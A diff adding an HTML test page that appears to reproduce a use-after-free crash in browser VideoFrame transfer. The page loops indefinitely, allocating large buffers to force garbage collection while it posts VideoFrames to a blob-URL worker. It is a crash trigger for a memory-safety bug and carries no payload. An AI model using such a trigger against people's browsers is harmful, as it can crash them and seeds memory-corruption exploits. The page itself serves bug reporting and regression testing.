@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>VideoFrame Transfer Crash Repro</title>
+<style>
+  body { font-family: sans-serif; padding: 20px; }
+  #status { font-weight: bold; color: red; }
+</style>
+</head>
+<body>
+<h1>VideoFrame Transfer Crash Repro</h1>
+<p>This page attempts to trigger a Use-After-Free crash during `VideoFrame` transfer by inducing high memory pressure to force a compacting GC exactly when `VideoFrameTransferList` is allocated.</p>
+<p id="status">Running...</p>
+<script>
+  // Create a self-contained Web Worker using a Blob URL
+  const workerCode = `
+    self.onmessage = (e) => {
+      // Just receive the message and close the frame if it made it
+      if (e.data && typeof e.data.close === 'function') {
+        e.data.close();
+      }
+    };
+  `;
+  const blob = new Blob([workerCode], { type: 'application/javascript' });
+  const worker = new Worker(URL.createObjectURL(blob));
+
+  // Create a dummy canvas to generate VideoFrames from
+  const canvas = new OffscreenCanvas(10, 10);
+  const ctx = canvas.getContext('2d');
+  ctx.fillStyle = 'blue';
+  ctx.fillRect(0, 0, 10, 10);
+
+  function triggerCrash() {
+    // 1. Create intense memory pressure to force frequent Garbage Collections.
+    // This increases the probability that GC runs inside MakeGarbageCollected.
+    const garbage = [];
+    for (let i = 0; i < 200; i++) {
+        garbage.push(new ArrayBuffer(1024 * 1024));
+    }
+
+    try {
+        // 2. Continously transfer VideoFrames while the GC is actively compacting.
+        const frame = new VideoFrame(canvas, { timestamp: performance.now() * 1000 });
+        worker.postMessage(frame, [frame]);
+    } catch (e) {
+        console.error("Failed to post message:", e);
+    }
+
+    // Release the allocated memory to allow GC to churn
+    garbage.length = 0;
+
+    // Keep the event loop busy
+    setTimeout(triggerCrash, 0);
+  }
+
+  // Start the loop
+  triggerCrash();
+</script>
+</body>
+</html>
